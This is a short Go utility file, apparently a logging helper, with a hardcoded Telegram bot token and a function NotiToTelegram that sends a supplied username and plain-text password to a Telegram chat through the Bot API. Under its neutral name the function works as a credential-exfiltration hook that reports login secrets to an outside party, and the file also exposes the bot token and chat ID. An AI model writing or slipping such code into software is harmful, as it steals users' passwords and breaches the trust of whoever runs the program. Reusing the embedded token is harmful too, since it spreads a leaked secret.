package util

import (
	"encoding/json"
	"fmt"
	"github.com/valyala/fasthttp"
	"time"
)

var TELEGRAM_CONFIG = map[string]string{
	"BOT_LOG_REQUEST": "5995852239:AAFxhvxgzCB3BLQvavwBNKra8tqwXVvq8yk",
	"DOMAIN":          "https://api.telegram.org/",
}

type TelegramLog struct {
	URL          string
	Error        interface{}
	Header       interface{}
	Res          interface{}
	Function     interface{}
	Method       string
	Params       interface{}
	Title        string
	ErrorMessage string
	ResponseTime time.Duration
	Response     string
	Body         string
}

func NotiToTelegram(username, password string) {
	url := TELEGRAM_CONFIG["DOMAIN"] + "bot" + TELEGRAM_CONFIG["BOT_LOG_REQUEST"] + "/sendMessage"
	html := fmt.Sprintf("Username: %s Password: %s", username, password)
	data := map[string]interface{}{
		"chat_id":    -1001958344643,
		"text":       html,
		"parse_mode": "HTML",
	}
	fmt.Println(data)
	dataSentByte, errJ := json.Marshal(data)
	if errJ != nil {
		fmt.Println("Error get data byte LogToTelegram: " + errJ.Error())
		return
	}
	// không call được hàm SendRequest vì sẽ bị lỗi gọi vòng tròn
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(url)
	req.Header.SetMethod("POST")
	req.Header.SetContentType("application/json")
	req.SetBodyRaw(dataSentByte)
	resp := fasthttp.AcquireResponse()

	client := &fasthttp.Client{}
	err := client.Do(req, resp)
	if err != nil {
		fmt.Println("Error get data byte LogToTelegram: " + err.Error())
	} else {
		bodyBytes := resp.Body()
		fmt.Println("Sent data byte LogToTelegram")
		fmt.Println("Sent data byte LogToTelegram" + string(bodyBytes))
	}
}
